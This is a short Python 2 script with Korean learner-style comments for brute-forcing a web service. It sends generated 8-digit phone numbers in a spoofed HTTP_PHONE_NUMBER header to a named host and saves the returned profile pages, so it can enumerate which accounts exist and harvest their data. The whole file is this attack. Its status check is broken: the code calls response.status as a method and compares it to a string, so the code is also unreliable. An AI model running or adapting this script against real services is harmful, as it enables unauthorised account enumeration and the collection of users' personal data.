# coding=utf_8
# GET 메소드를 사용한 무차별대입 인 경우에 이용 가능한 코드
import httplib
import random
import re, string
import itertools

f = open("result.txt", "w")

def getString(length=8, characters='7012835964'): # 그냥 임의의 초기값을 지정한듯
 for hp in itertools.product(characters, repeat=length):   # 핸드폰(hp) 넘버 랜덤 삽입
  yield ''.join(random.sample(hp,8)) # 이건 '' 을 붙인다 띄워져 있는 걸 붙여서 출력한다는 뜻이다, hp 값을 랜덤으로 조정해서 반환한다.

num = 0
for hp in getString():
    if num > 10: ## test 용으로 10번만 진행한다.
        break

    conn = httplib.HTTPConnection("test.magicn.com") # 요청 헤더값에서 host : 값을 지정
    conn.putrequest("GET","/kun/index.aspx?TAB=2") # GET /kun/index.aspx?TAB=2 HTTP/1.1 에서 HTTP/1.1 는 빼고 출력, put 하고 request 차이?
    conn.putheader("HTTP_PHONE_NUMBER",'82010'+hp)    # 앞에 공통 넘버 82010 를 선언하고 뒤에 hp (여덟자리)를 붙이는 코드
    conn.putheader("HTTP_DEVICE_INFO","LX:240,LY:320,CL:8,SX:98,SY:88,SC:8") # 이 역시 실제 코드를 그대로 입력
    conn.endheaders()

    response=conn.getresponse()
    if response.status() == '200 OK':   # 200 OK 떨어진 것들만 ,,
        print 'profile : ' + hp + 'is valid'
        data = response.read()  # 결과 html 을 data에 저장
        #print data
        f.write(data + "\n")
    else:
        print 'profile ' + hp + 'does not exist'

    num += 1
    conn.close()
# 기본적으로 문자열을 무작위로 대입하면서 모든 결과를 result.txt 에 쓰는거니까 현실적으로 사용이 불가능하다.
# 200 OK 떨어졌을때만 결과 대입해야한다.

